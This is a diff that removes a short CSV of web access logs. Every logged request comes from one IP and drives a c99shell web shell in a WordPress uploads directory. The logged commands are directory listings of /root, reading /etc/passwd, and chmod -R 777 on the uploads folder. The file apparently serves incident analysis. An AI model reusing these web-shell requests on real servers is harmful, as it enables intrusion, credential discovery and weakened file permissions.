@@ -1,9 +1,0 @@
-ip,date,method,url,status,size
-185.160.71.3,29/Nov/2024:04:11:46,GET,/wp-content/uploads/c99shell.php?act=cmd&d=%2Fvar%2Fwww%2Fhtml%2Fwp-content%2Fuploads%2F&cmd=pwd&cmd_txt=1&submit=Execute,200,3470
-185.160.71.3,29/Nov/2024:04:12:02,GET,/wp-content/uploads/c99shell.php?act=cmd&d=%2Fvar%2Fwww%2Fhtml%2Fwp-content%2Fuploads%2F&cmd=ls+%2Fhome%2Froot&cmd_txt=1&submit=Execute,200,3472
-185.160.71.3,29/Nov/2024:04:12:19,GET,/wp-content/uploads/c99shell.php?act=cmd&d=%2Fvar%2Fwww%2Fhtml%2Fwp-content%2Fuploads%2F&cmd=ls+%2F&cmd_txt=1&submit=Execute,200,3562
-185.160.71.3,29/Nov/2024:04:12:29,GET,/wp-content/uploads/c99shell.php?act=cmd&d=%2Fvar%2Fwww%2Fhtml%2Fwp-content%2Fuploads%2F&cmd=ls+%2Froot&cmd_txt=1&submit=Execute,200,3468
-185.160.71.3,29/Nov/2024:04:13:08,GET,/wp-content/uploads/c99shell.php?act=cmd&d=%2Fvar%2Fwww%2Fhtml%2Fwp-content%2Fuploads%2F&cmd=cat+%2Fetc%2Fpasswd&cmd_txt=1&submit=Execute,200,4105
-185.160.71.3,29/Nov/2024:04:13:31,GET,/wp-content/uploads/c99shell.php?act=cmd&d=%2Fvar%2Fwww%2Fhtml%2Fwp-content%2Fuploads%2F&cmd=cd+%2Fvar%2Fwww%2Fhtml&cmd_txt=1&submit=Execute,200,3468
-185.160.71.3,29/Nov/2024:04:18:31,GET,/wp-content/uploads/c99shell.php?act=cmd&d=%2Fvar%2Fwww%2Fhtml%2Fwp-content%2F&cmd=chmod+-R+777+uploads&cmd_txt=1&submit=Execute,200,3480
-185.160.71.3,29/Nov/2024:04:18:43,GET,/wp-content/uploads/c99shell.php?act=cmd&d=%2Fvar%2Fwww%2Fhtml%2Fwp-content%2F&cmd=ls+-l&cmd_txt=1&submit=Execute,200,3597
